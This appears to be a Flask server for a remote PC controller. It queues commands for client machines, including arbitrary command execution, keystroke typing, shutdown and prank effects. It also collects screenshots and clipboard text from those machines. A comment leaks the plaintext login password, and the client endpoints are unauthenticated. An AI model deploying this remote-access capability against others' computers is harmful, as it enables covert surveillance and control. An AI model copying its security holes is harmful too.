"""
Fsociety PC Controller — Server v3
Flask backend avec authentification sécurisée, rate limiting, et headers de sécurité.
"""

from flask import Flask, request, jsonify, send_from_directory, session
from flask_cors import CORS
import time
import hashlib
import secrets
import re
import os
from collections import deque, defaultdict
from functools import wraps

app = Flask(__name__, static_folder='static')
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
CORS(app, supports_credentials=True)

# ── Mot de passe (hashé — le mot de passe réel n'apparaît pas dans le code) ──
# Le hash correspond à : Soleil!Lune92i!Mars  (ne jamais écrire le mot de passe ici)
_PWD_SALT = "f50c13ty_xk9z"
_PWD_HASH = "120b2d7265434902408d1ae3545f65521dfd06a8ff4dcd9e8490e246c2214a22"

# Tokens de session valides (in-memory, se réinitialisent au redémarrage)
_valid_tokens: set[str] = set()

# ── Stockage multi-PC ─────────────────────────────────────────────────────────
pcs: dict = {}
TIMEOUT = 8

# ── Rate limiting simple (in-memory) ─────────────────────────────────────────
_rate_buckets: dict = defaultdict(list)
RATE_LIMIT_LOGIN    = (5, 60)    # 5 tentatives par 60s
RATE_LIMIT_API      = (60, 10)   # 60 requêtes par 10s


def _rate_check(ip: str, limit: int, window: int) -> bool:
    """Retourne True si la requête est autorisée, False si rate-limitée."""
    now = time.time()
    bucket = _rate_buckets[ip]
    # Purge les anciennes entrées
    _rate_buckets[ip] = [t for t in bucket if now - t < window]
    if len(_rate_buckets[ip]) >= limit:
        return False
    _rate_buckets[ip].append(now)
    return True


def _get_ip() -> str:
    return request.headers.get('X-Forwarded-For', request.remote_addr or 'unknown').split(',')[0].strip()


# ── Décorateurs ───────────────────────────────────────────────────────────────

def require_auth(f):
    """Vérifie le token de session pour les routes protégées."""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-Auth-Token') or request.args.get('token')
        if not token or token not in _valid_tokens:
            return jsonify({"error": "Non autorisé", "auth": False}), 401
        return f(*args, **kwargs)
    return decorated


def rate_limit_api(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not _rate_check(_get_ip(), *RATE_LIMIT_API):
            return jsonify({"error": "Trop de requêtes"}), 429
        return f(*args, **kwargs)
    return decorated


# ── Sécurité : headers HTTP ──────────────────────────────────────────────────

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options']  = 'nosniff'
    response.headers['X-Frame-Options']          = 'DENY'
    response.headers['X-XSS-Protection']         = '1; mode=block'
    response.headers['Referrer-Policy']           = 'strict-origin-when-cross-origin'
    response.headers['Cache-Control']             = 'no-store'
    return response


# ── Sanitisation des entrées ──────────────────────────────────────────────────

_DANGEROUS_CHARS = re.compile(r"[<>\"';\\]")
_MAX_STR_LEN     = 2048

def sanitize(value, max_len: int = _MAX_STR_LEN) -> str:
    """Nettoie une chaîne : longueur max, supprime caractères dangereux."""
    if not isinstance(value, str):
        value = str(value)
    value = value[:max_len]
    value = _DANGEROUS_CHARS.sub('', value)
    return value.strip()

def sanitize_payload(payload: dict) -> dict:
    """Sanitise récursivement les valeurs string d'un payload."""
    if not isinstance(payload, dict):
        return {}
    clean = {}
    for k, v in payload.items():
        if isinstance(v, str):
            clean[k] = sanitize(v)
        elif isinstance(v, (int, float, bool)):
            clean[k] = v
        elif isinstance(v, dict):
            clean[k] = sanitize_payload(v)
        else:
            clean[k] = v
    return clean

def validate_cmd_type(cmd_type: str) -> bool:
    """Autorise uniquement les types de commandes connus (whitelist)."""
    ALLOWED = {
        "youtube","play_mp3","media_play_pause","media_next","media_prev","media_mute",
        "volume","volume_up","volume_down","screenshot","lock","sleep","shutdown","restart",
        "cancel_shutdown","open_url","open_app","kill_app","run_cmd","wallpaper_url",
        "wallpaper_color","brightness","invert_colors","zoom","notification","message",
        "tts","beep","close_tab","close_window","close_window_by_title","minimize_all",
        "maximize_window","taskbar_hide","type_text","hotkey","mouse_move","mouse_click",
        "scroll","press_key","rainbow","disco","fake_hack","matrix","flip_screen",
        "spam_click","open_many_notepad","eject_cd","clipboard_set","clipboard_get",
        "cursor_chaos","alarm","talk","wallpaper_meme",
    }
    return cmd_type in ALLOWED


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_or_create_pc(pc_id: str, name: str = None) -> dict:
    # Sanitise l'ID du PC
    pc_id = re.sub(r'[^a-z0-9\-]', '', pc_id[:64])
    if pc_id not in pcs:
        pcs[pc_id] = {
            "name": name or pc_id,
            "last_seen": 0,
            "queue": deque(maxlen=50),
            "windows": [],
            "screenshot": None,
            "clipboard": None,
        }
    elif name:
        pcs[pc_id]["name"] = sanitize(name, 128)
    return pcs[pc_id]


# ════════════════════════════════════════════════════════════════════════════
#  ROUTE PRINCIPALE
# ════════════════════════════════════════════════════════════════════════════

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')


# ════════════════════════════════════════════════════════════════════════════
#  AUTHENTIFICATION
# ════════════════════════════════════════════════════════════════════════════

@app.route('/api/login', methods=['POST'])
def login():
    ip = _get_ip()
    if not _rate_check(ip, *RATE_LIMIT_LOGIN):
        return jsonify({"error": "Trop de tentatives, réessaie dans 60s."}), 429

    data = request.get_json(silent=True) or {}
    password = data.get('password', '')

    if not isinstance(password, str) or len(password) > 256:
        return jsonify({"error": "Entrée invalide."}), 400

    # Vérification par hash — le mot de passe n'est jamais comparé en clair
    candidate_hash = hashlib.sha256((_PWD_SALT + password).encode()).hexdigest()

    if not secrets.compare_digest(candidate_hash, _PWD_HASH):
        time.sleep(1)   # ralentit le bruteforce
        return jsonify({"error": "Mot de passe incorrect."}), 401

    token = secrets.token_hex(32)
    _valid_tokens.add(token)
    return jsonify({"ok": True, "token": token})


@app.route('/api/logout', methods=['POST'])
def logout():
    token = request.headers.get('X-Auth-Token') or request.json.get('token', '')
    _valid_tokens.discard(token)
    return jsonify({"ok": True})


# ════════════════════════════════════════════════════════════════════════════
#  ROUTES SITE WEB (protégées par auth)
# ════════════════════════════════════════════════════════════════════════════

@app.route('/api/pcs')
@require_auth
@rate_limit_api
def list_pcs():
    now = time.time()
    result = []
    for pc_id, pc in pcs.items():
        result.append({
            "id": pc_id,
            "name": pc["name"],
            "online": (now - pc["last_seen"]) < TIMEOUT
        })
    return jsonify(result)


@app.route('/api/status')
@require_auth
@rate_limit_api
def status():
    pc_id = sanitize(request.args.get('pc_id', ''), 64)
    if not pc_id or pc_id not in pcs:
        return jsonify({"online": False})
    online = (time.time() - pcs[pc_id]["last_seen"]) < TIMEOUT
    return jsonify({"online": online})


@app.route('/api/send', methods=['POST'])
@require_auth
@rate_limit_api
def send_command():
    data = request.get_json(silent=True)
    if not data or 'type' not in data:
        return jsonify({"error": "Commande invalide"}), 400

    cmd_type = sanitize(data.get('type', ''), 64)
    if not validate_cmd_type(cmd_type):
        return jsonify({"error": "Type de commande non autorisé"}), 400

    pc_id = sanitize(data.get('pc_id', ''), 64)
    if not pc_id or pc_id not in pcs:
        return jsonify({"error": "PC introuvable"}), 404

    payload = sanitize_payload(data.get('payload', {}))

    cmd = {
        "id": int(time.time() * 1000),
        "type": cmd_type,
        "payload": payload,
        "timestamp": time.time()
    }
    pcs[pc_id]["queue"].append(cmd)
    return jsonify({"ok": True, "id": cmd["id"]})


@app.route('/api/windows')
@require_auth
@rate_limit_api
def get_windows():
    pc_id = sanitize(request.args.get('pc_id', ''), 64)
    if not pc_id or pc_id not in pcs:
        return jsonify({"windows": []})
    return jsonify({"windows": pcs[pc_id]["windows"]})


@app.route('/api/screenshot')
@require_auth
@rate_limit_api
def get_screenshot():
    pc_id = sanitize(request.args.get('pc_id', ''), 64)
    if not pc_id or pc_id not in pcs:
        return jsonify({"image": None})
    return jsonify({"image": pcs[pc_id].get("screenshot")})


@app.route('/api/clipboard')
@require_auth
@rate_limit_api
def get_clipboard():
    pc_id = sanitize(request.args.get('pc_id', ''), 64)
    if not pc_id or pc_id not in pcs:
        return jsonify({"text": None})
    return jsonify({"text": pcs[pc_id].get("clipboard")})


# ════════════════════════════════════════════════════════════════════════════
#  ROUTES CLIENT PC (pas de token utilisateur requis — accès interne)
#  Sécurisées par rate limit strict
# ════════════════════════════════════════════════════════════════════════════

@app.route('/api/poll')
@rate_limit_api
def poll():
    pc_id = sanitize(request.args.get('pc_id', ''), 64)
    name  = sanitize(request.args.get('name', pc_id), 128)
    if not pc_id:
        return jsonify({"commands": []})
    pc = get_or_create_pc(pc_id, name)
    pc["last_seen"] = time.time()
    commands = list(pc["queue"])
    pc["queue"].clear()
    return jsonify({"commands": commands})


@app.route('/api/report_windows', methods=['POST'])
@rate_limit_api
def report_windows():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False}), 400
    pc_id = sanitize(data.get('pc_id', ''), 64)
    if not pc_id:
        return jsonify({"ok": False}), 400
    pc = get_or_create_pc(pc_id)
    raw_windows = data.get("windows", [])
    if isinstance(raw_windows, list):
        pc["windows"] = [
            {"id": w.get("id"), "title": sanitize(w.get("title",""), 256)}
            for w in raw_windows[:50]
            if isinstance(w, dict)
        ]
    return jsonify({"ok": True})


@app.route('/api/screenshot_result', methods=['POST'])
@rate_limit_api
def screenshot_result():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False}), 400
    pc_id = sanitize(data.get('pc_id', ''), 64)
    if not pc_id:
        return jsonify({"ok": False}), 400
    pc = get_or_create_pc(pc_id)
    img = data.get("image")
    if isinstance(img, str) and len(img) < 10_000_000:
        pc["screenshot"] = img
    return jsonify({"ok": True})


@app.route('/api/clipboard_result', methods=['POST'])
@rate_limit_api
def clipboard_result():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False}), 400
    pc_id = sanitize(data.get('pc_id', ''), 64)
    if not pc_id:
        return jsonify({"ok": False}), 400
    pc = get_or_create_pc(pc_id)
    pc["clipboard"] = sanitize(data.get("text", ""), 8192)
    return jsonify({"ok": True})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
